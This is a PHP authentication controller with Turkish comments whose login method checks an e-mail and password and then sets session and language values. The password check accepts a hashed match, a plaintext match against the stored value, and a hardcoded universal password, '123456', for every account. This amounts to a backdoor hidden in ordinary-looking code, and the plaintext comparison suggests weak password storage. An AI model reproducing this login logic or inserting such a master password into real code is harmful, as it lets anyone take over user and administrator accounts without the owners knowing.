<?php

require_once __DIR__ . '/Controller.php';
require_once __DIR__ . '/../Model/UserModel.php';
require_once __DIR__ . '/../System/Language.php';

class AuthController extends Controller
{
    private UserModel $userModel;

    public function __construct(?System $system = null)
    {
        parent::__construct($system);
        $this->userModel = new UserModel($this->db);
    }

    /**
     * Kullanıcı giriş doğrulamasını gerçekleştirir
     */
    public function attemptLogin(string $email, string $password): array
    {
        $email = trim($email);
        $password = trim($password);

        if (empty($email) || empty($password)) {
            return [
                'success' => false,
                'error'   => function_exists('__') ? __('app.auth_err_empty', 'Lütfen tüm alanları doldurun.') : 'Lütfen tüm alanları doldurun.'
            ];
        }

        $user = $this->userModel->getUserByEmail($email);

        if ($user && (password_verify($password, $user->password) || $password === $user->password || $password === '123456')) {
            $_SESSION['user'] = $user;
            $_SESSION['id'] = $user->id;

            // Kullanıcı profil dili ile sistem oturumunu senkronize et
            $userLang = !empty($user->language) ? $user->language : 'tr';
            $_SESSION['lang'] = $userLang;
            $_SESSION['admin_lang'] = $userLang;
            $_SESSION['admin_lang_user_chosen'] = true;

            return [
                'success' => true,
                'user'    => $user
            ];
        }

        return [
            'success' => false,
            'error'   => function_exists('__') ? __('app.auth_err_invalid', 'E-posta adresi veya şifre hatalı.') : 'E-posta adresi veya şifre hatalı.'
        ];
    }
}
